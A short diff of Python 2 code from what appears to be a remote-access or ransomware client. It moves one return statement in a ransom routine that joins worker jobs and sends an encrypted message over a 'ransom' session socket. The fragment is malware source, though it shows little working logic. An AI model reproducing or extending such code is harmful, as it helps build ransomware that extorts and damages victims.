@@ -1424,7 +1424,7 @@ class Client():
                             if self.jobs[job].is_alive():
                                 self.jobs[job].join()
                     self.session['ransom'].sendall(self._encrypt('0' * 64) + '\n')
-                    return "Ransom process completed"
+                return "Ransom process completed"
         except Exception as e:
             return "{} returned error: '{}'".format(self.ransom.func_name, str(e))
 
